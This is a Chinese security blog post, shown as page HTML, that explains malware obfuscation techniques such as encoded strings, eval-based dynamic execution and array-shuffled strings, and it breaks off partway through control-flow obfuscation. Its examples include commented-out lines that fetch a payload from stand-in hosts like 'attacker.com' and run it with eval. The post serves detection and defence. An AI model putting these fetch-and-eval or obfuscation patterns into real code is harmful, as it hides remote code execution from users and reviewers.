<!DOCTYPE html><html lang="en-us" class="__variable_dd5b2f scroll-smooth"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="preload" href="/_next/static/media/36966cca54120369-s.p.woff2" as="font" crossorigin="" type="font/woff2"/><link rel="stylesheet" href="/_next/static/css/c890694439b2475b.css" data-precedence="next"/><link rel="stylesheet" href="/_next/static/css/1ea5cf861ee12a80.css" data-precedence="next"/><link rel="stylesheet" href="/_next/static/css/a9b9096fa657c0d0.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-8506c16620cf39fb.js"/><script src="/_next/static/chunks/fd9d1056-30760135124e6678.js" async=""></script><script src="/_next/static/chunks/23-44b8024386371b46.js" async=""></script><script src="/_next/static/chunks/main-app-06a10a1bb45617e8.js" async=""></script><script src="/_next/static/chunks/ebde5ed1-51545511fe0d5050.js" async=""></script><script src="/_next/static/chunks/231-34a6a67d2da26855.js" async=""></script><script src="/_next/static/chunks/827-69594f61c16b8a9c.js" async=""></script><script src="/_next/static/chunks/850-ecf153581cc02044.js" async=""></script><script src="/_next/static/chunks/app/layout-54bebb918ae7f176.js" async=""></script><script src="/_next/static/chunks/app/blog/%5B...slug%5D/page-bd056182432da53b.js" async=""></script><script src="https://us.umami.is/script.js" async=""></script><title>揭秘恶意软件中的代码混淆把戏：深入原理与实例</title><meta name="description" content="恶意软件开发者常利用代码混淆技术来规避检测、隐藏真实意图。本文将深入剖析常见的混淆手段，如字符串编码、动态代码执行、控制流平坦化等，并通过实例揭示其工作原理，帮助开发者和安全研究员更好地识别和防范这些威胁。"/><meta name="robots" content="index, follow"/><meta name="googlebot" content="index, follow, max-video-preview:-1, max-image-preview:large, max-snippet:-1"/><link rel="canonical" href="https://blog.mainjay.cloudns.ch/blog/security/demystifying-obfuscation-techniques-in-malware"/><link rel="alternate" type="application/rss+xml" href="https://blog.mainjay.cloudns.ch/feed.xml"/><meta property="og:title" content="揭秘恶意软件中的代码混淆把戏：深入原理与实例"/><meta property="og:description" content="恶意软件开发者常利用代码混淆技术来规避检测、隐藏真实意图。本文将深入剖析常见的混淆手段，如字符串编码、动态代码执行、控制流平坦化等，并通过实例揭示其工作原理，帮助开发者和安全研究员更好地识别和防范这些威胁。"/><meta property="og:url" content="https://blog.mainjay.cloudns.ch/blog/security/demystifying-obfuscation-techniques-in-malware"/><meta property="og:site_name" content="MainJayLai Blog"/><meta property="og:locale" content="en_US"/><meta property="og:image" content="https://pngimg.com/uploads/github/github_PNG80.png"/><meta property="og:type" content="article"/><meta property="article:published_time" content="2025-05-09T00:00:00.000Z"/><meta property="article:modified_time" content="2025-05-09T00:00:00.000Z"/><meta property="article:author" content="mainJayLai"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:title" content="揭秘恶意软件中的代码混淆把戏：深入原理与实例"/><meta name="twitter:description" content="恶意软件开发者常利用代码混淆技术来规避检测、隐藏真实意图。本文将深入剖析常见的混淆手段，如字符串编码、动态代码执行、控制流平坦化等，并通过实例揭示其工作原理，帮助开发者和安全研究员更好地识别和防范这些威胁。"/><meta name="twitter:image" content="https://pngimg.com/uploads/github/github_PNG80.png"/><meta name="next-size-adjust"/><link rel="icon" type="image/png" href="https://mainjaylai.github.io/favicon.png"/><link rel="manifest" href="/static/favicons/manifest.json"/><meta name="msapplication-TileColor" content="#000000"/><meta name="theme-color" media="(prefers-color-scheme: light)" content="#fff"/><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000"/><meta name="referrer" content="no-referrer"/><link rel="alternate" type="application/rss+xml" href="/feed.xml"/><link href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@200..900&amp;display=swap" rel="stylesheet"/><link href="https://fonts.googleapis.com/css2?family=ZCOOL+KuaiLe&amp;family=ZCOOL+QingKe+HuangYou&amp;family=ZCOOL+XiaoWei&amp;display=swap" rel="stylesheet"/><script src="https://cdn.jsdelivr.net/gh/ashishagarwal2023/freegptjs@1.0.2/src/freegpt.min.js"></script><script src="/_next/static/chunks/polyfills-78c92fac7aa8fdd8.js" noModule=""></script></head><body class="bg-white pl-[calc(100vw-100%)] text-black antialiased dark:bg-gray-950 dark:text-white"><script>!function(){try{var d=document.documentElement,c=d.classList;c.remove('light','dark');var e=localStorage.getItem('theme');if('system'===e||(!e&&false)){var t='(prefers-color-scheme: dark)',m=window.matchMedia(t);if(m.media!==t||m.matches){d.style.colorScheme = 'dark';c.add('dark')}else{d.style.colorScheme = 'light';c.add('light')}}else if(e){c.add(e|| '')}else{c.add('light')}if(e==='light'||e==='dark'||!e)d.style.colorScheme=e||'light'}catch(e){}}()</script><section class="mx-auto max-w-3xl px-4 sm:px-6 xl:max-w-5xl xl:px-0"><div class="flex h-screen flex-col justify-between font-sans"><header class="flex items-center justify-between py-5"><div><a aria-label="Blog" href="/"><div class="flex items-center justify-between"><div class="mr-3"><img alt="logo" loading="lazy" width="44" height="44" decoding="async" data-nimg="1" style="color:transparent" src="https://mainjaylai.github.io/favicon.png"/></div><div class="hidden h-[44px] text-center text-3xl font-semibold leading-10 sm:block">Blog</div></div></a></div><div class="flex items-center space-x-4 leading-5 sm:space-x-6"><a class="navbar-item hidden font-medium text-gray-900 dark:text-gray-100 sm:block" href="/blog">Blog</a><a class="navbar-item hidden font-medium text-gray-900 dark:text-gray-100 sm:block" href="/tags">Tags</a><a target="_blank" rel="noopener noreferrer" href="https://mainjaylai.github.io" class="navbar-item hidden font-medium text-gray-900 dark:text-gray-100 sm:block">About</a><button aria-label="Search"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="h-6 w-6 text-gray-900 dark:text-gray-100"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-5.197-5.197m0 0A7.5 7.5 0 105.196 5.196a7.5 7.5 0 0010.607 10.607z"></path></svg></button><div class="mr-8"><div class="relative inline-block text-left" data-headlessui-state=""><div><button id="headlessui-menu-button-:R5pkqja:" type="button" aria-haspopup="menu" aria-expanded="false" data-headlessui-state=""><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" class="h-6 w-6 text-gray-900 dark:text-gray-100"><path fill-rule="evenodd" d="M10 2a1 1 0 011 1v1a1 1 0 11-2 0V3a1 1 0 011-1zm4 8a4 4 0 11-8 0 4 4 0 018 0zm-.464 4.95l.707.707a1 1 0 001.414-1.414l-.707-.707a1 1 0 00-1.414 1.414zm2.12-10.607a1 1 0 010 1.414l-.706.707a1 1 0 11-1.414-1.414l.707-.707a1 1 0 011.414 0zM17 11a1 1 0 100-2h-1a1 1 0 100 2h1zm-7 4a1 1 0 011 1v1a1 1 0 11-2 0v-1a1 1 0 011-1zM5.05 6.464A1 1 0 106.465 5.05l-.708-.707a1 1 0 00-1.414 1.414l.707.707zm1.414 8.486l-.707.707a1 1 0 01-1.414-1.414l.707-.707a1 1 0 011.414 1.414zM4 11a1 1 0 100-2H3a1 1 0 000 2h1z" clip-rule="evenodd"></path></svg></button></div></div></div><button aria-label="AI Chat" class="flex items-center justify-center rounded-full p-1.5 text-gray-800 transition-all hover:bg-gray-100 dark:text-gray-200 dark:hover:bg-gray-800"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path><path d="M8 9h8"></path><path d="M8 13h6"></path></svg></button><div class="mr-5"><div class="relative inline-block text-left" data-headlessui-state=""><div><button class="flex items-center" id="headlessui-menu-button-:R6pkqja:" type="button" aria-haspopup="menu" aria-expanded="false" data-headlessui-state=""><div class="mr-2">简体中文</div><svg viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1616" width="15" height="15"><path d="M670.72 325.696L511.552 152l87.68-87.872 360.96 389.504L832 453.76v0.64H64V325.76h606.72z m-318.4 382.08l157.248 172.8-94.976 79.552L63.872 579.84l147.712-0.704v-0.128H960v128.768H352.32z" fill="#262626" p-id="1617"></path></svg></button></div></div></div><button aria-label="Toggle Menu" class="sm:hidden"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" class="h-8 w-8 text-gray-900 dark:text-gray-100"><path fill-rule="evenodd" d="M3 5a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 10a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 15a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1z" clip-rule="evenodd"></path></svg></button><div class="opacity-98 fixed left-0 top-0 z-10 h-full w-full transform bg-white duration-300 ease-in-out dark:bg-gray-950 dark:opacity-[0.98] translate-x-full"><div class="flex justify-end"><button class="mr-8 mt-8 h-8 w-8" aria-label="Toggle Menu"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" class="text-gray-900 dark:text-gray-100"><path fill-rule="evenodd" d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z" clip-rule="evenodd"></path></svg></button></div><nav class="fixed mt-8 h-full"><div class="px-12 py-4"><a class="text-2xl font-bold tracking-widest text-gray-900 opacity-80 dark:text-gray-100" href="/">Home</a></div><div class="px-12 py-4"><a class="text-2xl font-bold tracking-widest text-gray-900 opacity-80 dark:text-gray-100" href="/blog">Blog</a></div><div class="px-12 py-4"><a class="text-2xl font-bold tracking-widest text-gray-900 opacity-80 dark:text-gray-100" href="/tags">Tags</a></div><div class="px-12 py-4"><a target="_blank" rel="noopener noreferrer" href="https://mainjaylai.github.io" class="text-2xl font-bold tracking-widest text-gray-900 opacity-80 dark:text-gray-100">About</a></div></nav></div></div></header><main class="mb-auto"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"揭秘恶意软件中的代码混淆把戏：深入原理与实例","datePublished":"2025-05-09T00:00:00.000Z","dateModified":"2025-05-09T00:00:00.000Z","description":"恶意软件开发者常利用代码混淆技术来规避检测、隐藏真实意图。本文将深入剖析常见的混淆手段，如字符串编码、动态代码执行、控制流平坦化等，并通过实例揭示其工作原理，帮助开发者和安全研究员更好地识别和防范这些威胁。","image":"https://pngimg.com/uploads/github/github_PNG80.png","url":"https://blog.mainjay.cloudns.ch/blog/security/demystifying-obfuscation-techniques-in-malware","author":[{"@type":"Person","name":"mainJayLai"}]}</script><section class="mx-auto max-w-3xl px-4 sm:px-6 xl:max-w-5xl xl:px-0"><div class="fixed bottom-8 right-8 hidden flex-col gap-3 md:hidden"><button aria-label="Scroll To Comment" class="rounded-full bg-gray-200 p-2 text-gray-500 transition-all hover:bg-gray-300 dark:bg-gray-700 dark:text-gray-400 dark:hover:bg-gray-600"><svg class="h-5 w-5" viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M18 10c0 3.866-3.582 7-8 7a8.841 8.841 0 01-4.083-.98L2 17l1.338-3.123C2.493 12.767 2 11.434 2 10c0-3.866 3.582-7 8-7s8 3.134 8 7zM7 9H5v2h2V9zm8 0h-2v2h2V9zM9 9h2v2H9V9z" clip-rule="evenodd"></path></svg></button><button aria-label="Scroll To Top" class="rounded-full bg-gray-200 p-2 text-gray-500 transition-all hover:bg-gray-300 dark:bg-gray-700 dark:text-gray-400 dark:hover:bg-gray-600"><svg class="h-5 w-5" viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M3.293 9.707a1 1 0 010-1.414l6-6a1 1 0 011.414 0l6 6a1 1 0 01-1.414 1.414L11 5.414V17a1 1 0 11-2 0V5.414L4.707 9.707a1 1 0 01-1.414 0z" clip-rule="evenodd"></path></svg></button></div><article><div><header><div class="space-y-1 border-b border-gray-200 pb-10 text-center dark:border-gray-700"><div class="beautiful-chinese-title"><h1 class="text-3xl font-extrabold leading-9 tracking-tight text-gray-900 dark:text-gray-100 sm:text-4xl sm:leading-10 md:text-5xl md:leading-14">揭秘恶意软件中的代码混淆把戏：深入原理与实例</h1></div><dl><div><dt class="sr-only">Published on</dt><dd class="text-base font-medium leading-6 text-gray-500 dark:text-gray-400"><time dateTime="2025-05-09T00:00:00.000Z">May 9, 2025</time></dd></div></dl></div></header><div class="grid-rows-[auto_1fr] divide-y divide-gray-200 pb-8 dark:divide-gray-700 xl:divide-y-0"><div class="divide-y divide-gray-200 dark:divide-gray-700 xl:col-span-3 xl:row-span-2 xl:pb-0"><div class="beautiful-chinese-content prose max-w-none pb-8 pt-10 dark:prose-invert"><h2 class="content-header" id="引言看不见的威胁"><a href="#引言看不见的威胁" aria-hidden="true" tabindex="-1"><span class="content-header-link"><svg class="h-5 linkicon w-5" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M12.232 4.232a2.5 2.5 0 0 1 3.536 3.536l-1.225 1.224a.75.75 0 0 0 1.061 1.06l1.224-1.224a4 4 0 0 0-5.656-5.656l-3 3a4 4 0 0 0 .225 5.865.75.75 0 0 0 .977-1.138 2.5 2.5 0 0 1-.142-3.667l3-3Z"></path><path d="M11.603 7.963a.75.75 0 0 0-.977 1.138 2.5 2.5 0 0 1 .142 3.667l-3 3a2.5 2.5 0 0 1-3.536-3.536l1.225-1.224a.75.75 0 0 0-1.061-1.06l-1.224 1.224a4 4 0 1 0 5.656 5.656l3-3a4 4 0 0 0-.225-5.865Z"></path></svg></span></a>引言：看不见的威胁</h2><p>“恶意软件包就在我们眼前，但直到为时已晚我们才发现它。” 这句话点出了一个残酷的现实：攻击者越来越依赖代码混淆（Obfuscation）技术，将恶意负载巧妙地伪装起来，试图绕过安全防御系统和代码审查人员的火眼金睛。理解这些跨越不同生态系统（如 npm、PyPI、Maven 和 Go 模块）的混淆技术，对于旨在保护其软件供应链的开发人员和安全团队至关重要。</p><h2 class="content-header" id="什么是代码混淆"><a href="#什么是代码混淆" aria-hidden="true" tabindex="-1"><span class="content-header-link"><svg class="h-5 linkicon w-5" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M12.232 4.232a2.5 2.5 0 0 1 3.536 3.536l-1.225 1.224a.75.75 0 0 0 1.061 1.06l1.224-1.224a4 4 0 0 0-5.656-5.656l-3 3a4 4 0 0 0 .225 5.865.75.75 0 0 0 .977-1.138 2.5 2.5 0 0 1-.142-3.667l3-3Z"></path><path d="M11.603 7.963a.75.75 0 0 0-.977 1.138 2.5 2.5 0 0 1 .142 3.667l-3 3a2.5 2.5 0 0 1-3.536-3.536l1.225-1.224a.75.75 0 0 0-1.061-1.06l-1.224 1.224a4 4 0 1 0 5.656 5.656l3-3a4 4 0 0 0-.225-5.865Z"></path></svg></span></a>什么是代码混淆？</h2><p>代码混淆是一种故意将清晰易读的源代码转换成难以理解、复杂甚至看似毫无意义的指令集的过程。在合法场景下，开发者可能会使用混淆技术来保护知识产权，或者通过代码压缩（Minification）来减小文件体积。然而，不幸的是，恶意行为者普遍滥用这种策略，以逃避自动化安全工具和人工审查流程的检测。其核心目标是：<strong>增加分析难度，延长被发现的时间，甚至完全躲避检测。</strong></p><h2 class="content-header" id="常见的代码混淆技术及其原理剖析"><a href="#常见的代码混淆技术及其原理剖析" aria-hidden="true" tabindex="-1"><span class="content-header-link"><svg class="h-5 linkicon w-5" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M12.232 4.232a2.5 2.5 0 0 1 3.536 3.536l-1.225 1.224a.75.75 0 0 0 1.061 1.06l1.224-1.224a4 4 0 0 0-5.656-5.656l-3 3a4 4 0 0 0 .225 5.865.75.75 0 0 0 .977-1.138 2.5 2.5 0 0 1-.142-3.667l3-3Z"></path><path d="M11.603 7.963a.75.75 0 0 0-.977 1.138 2.5 2.5 0 0 1 .142 3.667l-3 3a2.5 2.5 0 0 1-3.536-3.536l1.225-1.224a.75.75 0 0 0-1.061-1.06l-1.224 1.224a4 4 0 1 0 5.656 5.656l3-3a4 4 0 0 0-.225-5.865Z"></path></svg></span></a>常见的代码混淆技术及其原理剖析</h2><p>让我们深入探讨一些在各种生态系统中广泛应用的混淆方法，并详细解释其背后的原理。</p><h3 class="content-header" id="1-字符串编码与字符操纵-encoded-strings--character-manipulation"><a href="#1-字符串编码与字符操纵-encoded-strings--character-manipulation" aria-hidden="true" tabindex="-1"><span class="content-header-link"><svg class="h-5 linkicon w-5" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M12.232 4.232a2.5 2.5 0 0 1 3.536 3.536l-1.225 1.224a.75.75 0 0 0 1.061 1.06l1.224-1.224a4 4 0 0 0-5.656-5.656l-3 3a4 4 0 0 0 .225 5.865.75.75 0 0 0 .977-1.138 2.5 2.5 0 0 1-.142-3.667l3-3Z"></path><path d="M11.603 7.963a.75.75 0 0 0-.977 1.138 2.5 2.5 0 0 1 .142 3.667l-3 3a2.5 2.5 0 0 1-3.536-3.536l1.225-1.224a.75.75 0 0 0-1.061-1.06l-1.224 1.224a4 4 0 1 0 5.656 5.656l3-3a4 4 0 0 0-.225-5.865Z"></path></svg></span></a>1. 字符串编码与字符操纵 (Encoded Strings &amp; Character Manipulation)</h3><p><strong>攻击者为何青睐此法：</strong> 编码能够让攻击者隐藏关键的 URL、敏感令牌或恶意命令，使得自动化扫描器和人工审查难以迅速识别其恶意意图。</p><p><strong>如何帮助攻击者：</strong> 可读的字符串（如 <code class="custom-code">https://evil-domain.com/malware.exe</code>）被转换为编码序列（如十六进制 <code class="custom-code">\x68\x74\x74\x70...</code>、Unicode <code class="custom-code">\u0068\u0074...</code> 或 Base64 <code class="custom-code">aHR0cHM6Ly9ldmlsLWRvbWFpbi5jb20vbWFsd2FyZS5leGU=</code>）。这些编码后的字符串在代码中不再那么显眼，更容易与正常代码混为一谈。</p><p><strong>原理详解：</strong> 计算机在处理字符时，本质上是处理其对应的数字编码（例如 ASCII、Unicode）。攻击者利用这一点，不直接在代码中写入明文字符串，而是写入这些字符的编码表示。程序在运行时，会先将这些编码值解码回原始字符串，然后再执行相应的操作。</p><ul><li><strong>十六进制/八进制编码：</strong> 将每个字符用其十六进制（如 <code class="custom-code">\x41</code> 代表 &#x27;A&#x27;）或八进制（如 <code class="custom-code">\101</code> 代表 &#x27;A&#x27;）形式表示。</li><li><strong>Unicode 转义：</strong> 使用 <code class="custom-code">\uXXXX</code> 格式表示 Unicode 字符。</li><li><strong>Base64 编码：</strong> 将二进制数据转换成由64个可打印字符组成的文本字符串，常用于隐藏较长的字符串或二进制内容。</li><li><strong>自定义编码/加密：</strong> 攻击者甚至可能使用自定义的简单加密算法（如凯撒密码、XOR 加密）或更复杂的加密库来隐藏字符串，然后在运行时解密。</li></ul><div class="relative"><pre><code class="language-javascript code-highlight"><span class="code-line"><span class="token comment">// 原始恶意 URL: &quot;http://malicious.com/payload&quot;</span>
</span><span class="code-line"><span class="token comment">// 十六进制编码示例</span>
</span><span class="code-line"><span class="token keyword">const</span> encodedUrlHex <span class="token operator">=</span>
</span><span class="code-line">  <span class="token string">&#x27;\x68\x74\x74\x70\x3a\x2f\x2f\x6d\x61\x6c\x69\x63\x69\x6f\x75\x73\x2e\x63\x6f\x6d\x2f\x70\x61\x79\x6c\x6f\x61\x64&#x27;</span>
</span><span class="code-line"><span class="token comment">// fetch(encodedUrlHex); // 运行时解码并执行</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token comment">// Base64 编码示例</span>
</span><span class="code-line"><span class="token keyword">const</span> encodedUrlBase64 <span class="token operator">=</span> <span class="token string">&#x27;aHR0cDovL21hbGljaW91cy5jb20vcGF5bG9hZA==&#x27;</span>
</span><span class="code-line"><span class="token comment">// fetch(atob(encodedUrlBase64)); // 运行时解码并执行 (atob是浏览器提供的Base64解码函数)</span>
</span></code></pre></div><h3 class="content-header" id="2-动态代码生成与执行-dynamic-code-generation--execution"><a href="#2-动态代码生成与执行-dynamic-code-generation--execution" aria-hidden="true" tabindex="-1"><span class="content-header-link"><svg class="h-5 linkicon w-5" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M12.232 4.232a2.5 2.5 0 0 1 3.536 3.536l-1.225 1.224a.75.75 0 0 0 1.061 1.06l1.224-1.224a4 4 0 0 0-5.656-5.656l-3 3a4 4 0 0 0 .225 5.865.75.75 0 0 0 .977-1.138 2.5 2.5 0 0 1-.142-3.667l3-3Z"></path><path d="M11.603 7.963a.75.75 0 0 0-.977 1.138 2.5 2.5 0 0 1 .142 3.667l-3 3a2.5 2.5 0 0 1-3.536-3.536l1.225-1.224a.75.75 0 0 0-1.061-1.06l-1.224 1.224a4 4 0 1 0 5.656 5.656l3-3a4 4 0 0 0-.225-5.865Z"></path></svg></span></a>2. 动态代码生成与执行 (Dynamic Code Generation &amp; Execution)</h3><p><strong>攻击者为何青睐此法：</strong> 动态执行允许攻击者在不更改原始受感染包的情况下远程更新和传递有效负载，从而绕过基于静态分析的检测。</p><p><strong>如何帮助攻击者：</strong> 使用如 <code class="custom-code">eval()</code> (JavaScript)、<code class="custom-code">exec()</code> (Python)、<code class="custom-code">Runtime.exec()</code> (Java) 等函数来执行在运行时生成或从远端获取的字符串形式的代码。这使得静态分析工具无法在分析阶段看到完整的恶意代码。</p><p><strong>原理详解：</strong> 静态分析是在不实际运行代码的情况下检查代码。而动态代码生成与执行则将恶意代码的构建和执行推迟到程序运行时。</p><ul><li><strong><code class="custom-code">eval()</code>/<code class="custom-code">exec()</code> 类函数：</strong> 这些函数接收一个字符串作为参数，并将该字符串当作代码来执行。攻击者可以将恶意代码拆分成碎片，或者从远程服务器下载，然后在运行时拼接成完整的代码字符串再通过 <code class="custom-code">eval()</code> 执行。</li><li><strong><code class="custom-code">document.write()</code> / <code class="custom-code">innerHTML</code> (浏览器环境)：</strong> 在 Web 环境中，攻击者可能动态地将 <code class="custom-code">&lt;script&gt;</code> 标签写入 DOM，从而执行新的脚本。</li><li><strong>反射 (Reflection) (Java, .NET)：</strong> 允许程序在运行时检查和修改其自身结构（类、方法、字段等），可以被用来动态调用隐藏的方法或加载恶意类。</li></ul><div class="relative"><pre><code class="language-javascript code-highlight"><span class="code-line"><span class="token comment">// 示例：动态构建并执行 alert(&quot;hacked!&quot;)</span>
</span><span class="code-line"><span class="token keyword">const</span> parts <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">&#x27;al&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;er&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;t(&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;&quot;hacked!&quot;&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;)&#x27;</span><span class="token punctuation">]</span>
</span><span class="code-line"><span class="token keyword">const</span> evilCode <span class="token operator">=</span> parts<span class="token punctuation">.</span><span class="token function method property-access">join</span><span class="token punctuation">(</span><span class="token string">&#x27;&#x27;</span><span class="token punctuation">)</span> <span class="token comment">// &quot;alert(\&quot;hacked!\&quot;)&quot;</span>
</span><span class="code-line"><span class="token comment">// eval(evilCode);</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token comment">// 从远程获取代码执行 (概念示例)</span>
</span><span class="code-line"><span class="token comment">// fetch(&#x27;https://attacker.com/payload.js&#x27;)</span>
</span><span class="code-line"><span class="token comment">//   .then(response =&gt; response.text())</span>
</span><span class="code-line"><span class="token comment">//   .then(code =&gt; eval(code));</span>
</span></code></pre></div><p>这种方式对静态分析工具构成了巨大挑战，因为恶意代码在分析阶段根本不存在于代码文件中。</p><h3 class="content-header" id="3-基于数组的字符串混淆与移位-array-based-string-obfuscation-and-shifting"><a href="#3-基于数组的字符串混淆与移位-array-based-string-obfuscation-and-shifting" aria-hidden="true" tabindex="-1"><span class="content-header-link"><svg class="h-5 linkicon w-5" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M12.232 4.232a2.5 2.5 0 0 1 3.536 3.536l-1.225 1.224a.75.75 0 0 0 1.061 1.06l1.224-1.224a4 4 0 0 0-5.656-5.656l-3 3a4 4 0 0 0 .225 5.865.75.75 0 0 0 .977-1.138 2.5 2.5 0 0 1-.142-3.667l3-3Z"></path><path d="M11.603 7.963a.75.75 0 0 0-.977 1.138 2.5 2.5 0 0 1 .142 3.667l-3 3a2.5 2.5 0 0 1-3.536-3.536l1.225-1.224a.75.75 0 0 0-1.061-1.06l-1.224 1.224a4 4 0 1 0 5.656 5.656l3-3a4 4 0 0 0-.225-5.865Z"></path></svg></span></a>3. 基于数组的字符串混淆与移位 (Array-Based String Obfuscation and Shifting)</h3><p><strong>攻击者为何青睐此法：</strong> 将字符串存储在数组中，并通过间接引用（如下标计算、函数调用返回下标等）来访问，这使得逆向工程和人工代码审查变得更加复杂。</p><p><strong>如何帮助攻击者：</strong> 敏感字符串被拆分、打乱顺序后存储在数组中，通过复杂的索引逻辑或函数调用来重组和访问，从而掩盖其真实意图，减慢分析速度。</p><p><strong>原理详解：</strong> 此技术的核心思想是将完整的字符串打散成多个部分，存储在一个或多个数组中。然后通过索引、循环、函数调用等方式在运行时动态地将这些部分重新组合成原始字符串。</p><ul><li><strong>字符串分割与重组：</strong> <code class="custom-code">&quot;secret_key&quot;</code> 可能被存储为 <code class="custom-code">[&quot;sec&quot;, &quot;ret_&quot;, &quot;key&quot;]</code>，然后通过 <code class="custom-code">arr[0] + arr[1] + arr[2]</code> 来重组。</li><li><strong>顺序打乱与重排：</strong> 数组中的元素顺序可能是乱的，通过另一个数组或逻辑来指定正确的重组顺序。</li><li><strong>数组移位/旋转：</strong> 有些混淆器（如 JavaScript Obfuscator Tool 的 <code class="custom-code">stringArrayRotate</code> 选项）会初始化一个包含所有字符串片段的数组，并在每次访问前对数组进行“旋转”（将最后一个元素移到最前面，或反之），使得每次实际访问的元素下标都在变化，增加了追踪难度。</li></ul><div class="relative"><pre><code class="language-javascript code-highlight"><span class="code-line"><span class="token comment">// 直接看难以理解:</span>
</span><span class="code-line"><span class="token keyword">let</span> confusingArray <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">&#x27;https://&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;domain&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;.com&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;evil-&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;/path&#x27;</span><span class="token punctuation">]</span>
</span><span class="code-line"><span class="token comment">// 假设通过某种逻辑计算出正确的索引顺序</span>
</span><span class="code-line"><span class="token keyword">let</span> p1 <span class="token operator">=</span> confusingArray<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token comment">// &quot;https://&quot;</span>
</span><span class="code-line"><span class="token keyword">let</span> p2 <span class="token operator">=</span> confusingArray<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token comment">// &quot;evil-&quot;</span>
</span><span class="code-line"><span class="token keyword">let</span> p3 <span class="token operator">=</span> confusingArray<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token comment">// &quot;domain&quot;</span>
</span><span class="code-line"><span class="token keyword">let</span> p4 <span class="token operator">=</span> confusingArray<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token comment">// &quot;.com&quot;</span>
</span><span class="code-line"><span class="token keyword">let</span> p5 <span class="token operator">=</span> confusingArray<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token comment">// &quot;/path&quot;</span>
</span><span class="code-line"><span class="token keyword">let</span> finalUrl <span class="token operator">=</span> p1 <span class="token operator">+</span> p2 <span class="token operator">+</span> p3 <span class="token operator">+</span> p4 <span class="token operator">+</span> p5 <span class="token comment">// &quot;https://evil-domain.com/path&quot;</span>
</span><span class="code-line"><span class="token comment">// fetch(finalUrl);</span>
</span></code></pre></div><p>分析人员需要仔细追踪数组元素如何被访问和组合，才能理解最终形成的字符串。</p><h3 class="content-header" id="4-控制流混淆-control-flow-obfuscation"><a href="#4-控制流混淆-control-flow-obfuscation" aria-hidden="true" tabindex="-1"><span class="content-header-link"><svg class="h-5 linkicon w-5" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M12.232 4.232a2.5 2.5 0 0 1 3.536 3.536l-1.225 1.224a.75.75 0 0 0 1.061 1.06l1.224-1.224a4 4 0 0 0-5.656-5.656l-3 3a4 4 0 0 0 .225 5.865.75.75 0 0 0 .977-1.138 2.5 2.5 0 0 1-.142-3.667l3-3Z"></path><path d="M11.603 7.963a.75.75 0 0 0-.977 1.138 2.5 2.5 0 0 1 .142 3.667l-3 3a2.5 2.5 0 0 1-3.536-3.536l1.225-1.224a.75.75 0 0 0-1.061-1.06l-1.224 1.224a4 4 0 1 0 5.656 5.656l3-3a4 4 0 0 0-.225-5.865Z"></path></svg></span></a>4. 控制流混淆 (Control Flow Obfuscation)</h3><p><strong>攻击者为何青睐此法：</strong> 复杂的条件判断、冗余的循环、无意义的跳转等会使代码的执行逻辑变得混乱不堪，导致审查人员在看似无害的代码中忽略隐藏的恶意意图。</p><p><strong>如何帮助攻击者：</strong> 混淆的控制流会分散审查人员的注意力，降低检测效率。分析师可能难以确定代码的真实执行路径。</p><p><strong>原理详解：</strong> 控制流混淆旨在打乱程序正常的执行顺序，使其难以通过阅读代码来理解。</p><ul><li><strong>不透明谓词 (Opaque Predicates)：</strong> 